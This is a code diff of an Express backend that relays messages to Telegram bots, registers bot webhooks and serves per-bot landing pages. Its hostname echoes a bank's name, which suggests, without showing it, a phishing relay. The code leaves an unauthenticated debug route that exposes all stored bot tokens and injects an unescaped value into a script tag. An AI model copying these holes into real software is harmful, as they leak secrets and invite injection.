@@ -52,11 +52,7 @@ async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
     try {
         await axios.post(
             `https://api.telegram.org/bot${bot.botToken}/sendMessage`,
-            {
-                chat_id: bot.chatId,
-                text,
-                reply_markup: { inline_keyboard: inlineKeyboard }
-            }
+            { chat_id: bot.chatId, text, reply_markup: { inline_keyboard: inlineKeyboard } }
         );
         console.log(`✅ Telegram message sent by ${bot.botId}`);
     } catch (err) {
@@ -77,17 +73,13 @@ async function answerCallback(bot, callbackId) {
 }
 
 // ---------------- DYNAMIC PAGE SERVING ----------------
-
-// --- FIXED: Inject botId into index.html ---
 app.get('/bot/:botId', (req, res) => {
     const bot = getBot(req.params.botId);
     if (!bot) return res.status(404).send('Invalid bot link');
 
-    let indexHtml = fs.readFileSync(path.join(__dirname, 'public', 'index.html'), 'utf-8');
-
-    // Inject botId into localStorage
-    const injectScript = `<script>localStorage.setItem('botId','${bot.botId}');</script>`;
-    indexHtml = indexHtml.replace('</body>', `${injectScript}\n</body>`);
+    // Inject botId into index.html dynamically
+    let indexHtml = fs.readFileSync(path.join(__dirname, 'public', 'index.html'), 'utf8');
+    indexHtml = `<script>localStorage.setItem('botId', '${bot.botId}');</script>\n` + indexHtml;
 
     res.send(indexHtml);
 });
@@ -176,27 +168,19 @@ app.post('/add-bot', async (req, res) => {
 
     bots.push({ botId, botToken, chatId });
     saveBots();
-    console.log(`✅ Bot added: ${botId}`);
 
     const webhookUrl = `https://zanaco-backend.onrender.com/telegram-webhook/${botId}`;
     try {
-        const resp = await axios.get(`https://api.telegram.org/bot${botToken}/setWebhook?url=${webhookUrl}`);
-        console.log(`✅ Webhook set for ${botId}:`, resp.data);
+        await axios.get(`https://api.telegram.org/bot${botToken}/setWebhook?url=${webhookUrl}`);
     } catch (err) {
-        console.error('❌ Failed to set webhook:', err.response?.data || err.message);
         return res.status(500).json({ error: 'Failed to set webhook' });
     }
 
-    res.json({
-        ok: true,
-        botLink: `https://zanaco-backend.onrender.com/bot/${botId}`
-    });
+    res.json({ ok: true, botLink: `https://zanaco-backend.onrender.com/bot/${botId}` });
 });
 
 // ---------------- DEBUG ROUTE ----------------
-app.get('/debug/bots', (req, res) => {
-    res.json(bots);
-});
+app.get('/debug/bots', (req, res) => res.json(bots));
 
 // ---------------- START SERVER ----------------
 app.listen(PORT, () => {
